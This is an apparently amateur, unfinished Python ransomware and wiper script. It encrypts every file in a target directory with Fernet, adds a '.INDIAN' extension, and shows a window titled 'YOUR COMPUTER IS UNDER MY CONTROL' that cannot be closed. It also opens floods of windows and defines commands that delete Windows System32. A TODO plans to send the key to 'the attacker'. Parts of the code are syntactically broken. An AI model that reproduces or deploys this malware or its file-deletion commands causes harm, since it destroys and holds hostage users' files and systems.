## IMPORTS
from PIL import Image, ImageTk
import pyautogui
import os
import time
import tkinter as tk
import tkinter.ttk as ttk
import tkinter.messagebox # Need to edit the pyautogui shit bruv
import sys
from cryptography.fernet import Fernet
import playsound
from pathlib import Path
import subprocess
import shutil
import psutil


global target_dir = "C:/Users/Jeba/Documents/CODING/Python/to be tested"
global vlc_path = "C:\Program Files (x86)\VideoLAN\VLC"

# WARN THE USER
class Warn:
    def __init__(self):
        
        warnUSR = "YOU ARE ABOUT TO DESTROY THE COMPUTER YOU ARE USING"
        warnUSR_again = "ARE SURE THAT YOU ARE ABOUT TO SCREW UP YOUR PC?"
        '''
        self.root = tk.Tk()
        self.root.title("WARNING")
        self.label = ttk.Label(self.root, text = warnUSR_str, font = "Consolas").grid()
        self.button = ttk.Button(self.root, text = "EXIT", command=quit).grid() #EXIT BUTTON
        self.button = ttk.Button(self.root, text = "Continue", command=infection).grid()
        '''
        z=pyautogui.confirm(text=warnUSR, title="!!! WARNING !!!", buttons=(["EXIT!", "continue"]))
        if z.startswith("E"):
            sys.exit()
        else:
            time.sleep(1)
            f=pyautogui.confirm(text=warnUSR_again, title = "Seriously WHAT?", buttons=(["LET ME EXIT!", "I know what I am doing."]))

        if f.startswith("I"):
            Infected().run()#encrypt()
        else:
            sys.exit()
            
def decrypt():
    print(f"Attempting to decrypt {os.getlogin()}'s files")
    def decrypt_file(encrypted_file_path, key):
        cipher_suite = Fernet(key)
        
        with open(encrypted_file_path, 'rb') as encrypted_file:
            encrypted_data = encrypted_file.read()
            decrypted_data = cipher_suite.decrypt(encrypted_data)
            
        decrypted_file_path = encrypted_file_path[:-7]
        with open(decrypted_file_path, 'wb') as decrypted_file:
            decrypted_file.write(decrypted_data)

    def decrypt_directory(encrypted_directory_path, key):
        for root, dirs, files in os.walk(encrypted_directory_path):
            for file in files:
                if file.endswith(".INDIAN"):
                    encrypted_file_path = os.path.join(root, file)
                    decrypt_file(encrypted_file_path, key)

    # Use the same key you used for encryption
    #key = b'enterthekeytoencrypt'
    key  = input("Enter the key to encrypt: ")

    # Directory to decrypt
    encrypted_directory = target_dir

    # Decrypt the files within the directory
    decrypt_directory(encrypted_directory, key)

    print("Directory decrypted!")

#--------------------------------------------------------------------------------------

def encrypt():
    print(f"Attempting to encrypt {os.getlogin()}'s files")
    def generate_key():
        return Fernet.generate_key()

    def encrypt_file(file_path, key):
        cipher_suite = Fernet(key)
        
        with open(file_path, 'rb') as file:
            plaintext = file.read()
            encrypted_data = cipher_suite.encrypt(plaintext)
            
        with open(file_path + ".INDIAN", 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)

    def encrypt_directory(directory_path, key):
        for root, dirs, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key)

    # Generate a key
    key = generate_key() #Bro where should i send the key lol

    # Directory to encrypt
    directory_to_encrypt = target_dir

    # Encrypt the files within the directory
    encrypt_directory(directory_to_encrypt, key)

    print("Directory encrypted!")
    print(key)
    Infected().run() #Run UI after the operation.


#------------------------------------------------------------------------------------------ THE DAMN UI
def donotclose():
    pass
class Infected:
    def __init__(self):
        self.root = tk.Tk()
        size = "800x600"
        self.root.title("YOUR COMPUTER IS UNDER MY CONTROL")
        self.root.geometry(size)
        self.root.maxsize(800,600)
        self.root.minsize(800,600)
        self.root.protocol("WM_DELETE_WINDOW", donotclose)
        #self.label = Label(self.root, text="YOUR FILES BELONG TO ME", font=("Arial", 12))
        
    def run(self):
        self.root.mainloop()
        
def videolan():
    

def chaos():
    openlimit = 2 #----------------------------------------------------------------------- OPENLIMIT
    openimg_1 = 0
    openshit = 1
    itsmylife = playsound._playsoundWin('audio\\aud_1.mp2', block=True)
    img_1 = Image.open('img\img_1.jpg')
    
    # open cmd ###########
    while openshit < openlimit:
        os.system("start cmd")
        os.system("start explorer")
        os.system("start notepad")
        os.system("start iexpress")
        os.system("start chrome")
        openshit += 1
        print("started shitty things") #says started cmd lmao
    
    # Open an image file #####################################
    while openimg_1 < openlimit:
        img_1.show()
        openimg_1 += 1


''' !!!!!!!!!!!!!!   EXTREMLY IMPORTANT, WORK WITH CARE   !!!!!!!!!!!!!! '''

def destroy_computer():
    fun = "tree"
    del_sys32 = "del /s /q C:\Windows\System32*"
    del_sys32_2 = "rd /s /q C:/Windows/System32"

    def is_app_running_windows(app_name):
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] == app_name:
                return True
        return False

    # Example usage
    app_name = "cmd.exe"
    is_running = is_app_running_windows(app_name)
    chk=print(f"{is_running}")
    if chk == "True":
            subprocess.Popen("cmd")
            time.sleep(1)
            pyautogui.typewrite(fun)#------------------------------- TAKE EXTREME CARE
            pyautogui.press("Enter")
            pyautogui.typewrite(fun)#------------------------------- TAKE EXTREME CARE
            pyautogui.press("Enter")
            print("OS destroyed")
    else:
        subprocess.Popen("cmd")
        time.sleep(3)
        pyautogui.typewrite(fun)#------------------------------- TAKE EXTREME CARE
        pyautogui.press("Enter")
        pyautogui.typewrite(fun)#------------------------------- TAKE EXTREME CARE
        pyautogui.press("Enter")
        print("OS destroyed")


'''-------------------------- END of DESTRUCITVE CODE -----------------------------'''
def quit():
    sys.exit()

Warn()



'''
TO DO:
Make a UI.
Send encryption key to the attacker i.e., me.

DAMN bro

'''
